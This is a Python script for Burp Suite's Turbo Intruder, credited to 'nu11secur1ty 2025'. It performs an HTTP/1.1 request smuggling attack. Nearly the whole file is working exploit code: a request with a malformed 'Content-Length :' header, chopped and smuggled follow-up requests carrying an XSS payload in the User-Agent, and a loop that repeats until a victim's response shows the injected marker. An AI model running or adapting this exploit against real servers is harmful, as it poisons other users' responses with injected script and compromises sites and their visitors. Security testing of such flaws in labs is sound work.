# HTTP/1.1 request smuggling
# nu11secur1ty 2025
# Burp POST body smuggling

stop_attack = False  # global flag to stop the loop

def queueRequests(target, wordlists):
    global stop_attack

    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=1,
        engine=Engine.BURP,
        maxRetriesPerRequest=0,
        timeout=15
    )

    kurnabiva1 = '''POST /resources/images/avatarDefault.svg HTTP/1.1
Host: ''' + host + '''
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length : %s

'''

    smuggled = '''GET /post?postId=10 HTTP/1.1
User-Agent: yu5md"><script>alert(1)</script>hgpov
user-agent: yu5md"><script>alert(1)</script>hgpov
X: Y'''

    kurnabiva2_chopped = '''GET / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
X: Y'''

    kurnabiva2_revealed = '''GET /404 HTTP/1.1
Host: ''' + host + '''
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''

    victim = '''GET / HTTP/1.1
Host: ''' + host + '''
User-Agent: foo

'''

    if '%s' not in kurnabiva1:
        raise Exception('Content-Length placeholder (%s) missing in kurnabiva1')

    if not kurnabiva1.endswith('\r\n\r\n'):
        raise Exception('kurnabiva1 must end with a blank line and have no body')

    while not stop_attack:
        engine.queue(kurnabiva1, len(kurnabiva2_chopped), label='kurnabiva1', fixContentLength=False)
        engine.queue(kurnabiva2_chopped + kurnabiva2_revealed + smuggled, label='kurnabiva2')
        time.sleep(0.8)
        engine.queue(victim, label='victim')


def handleResponse(req, interesting):
    global stop_attack
    table.add(req)
    
    # Stop attack if XSS marker is detected in the victim response
    if req.label == 'victim' and 'hgpov' in req.response:
        stop_attack = True
        req.engine.cancel()
        print("[+] Donne, your exploit is finished!")
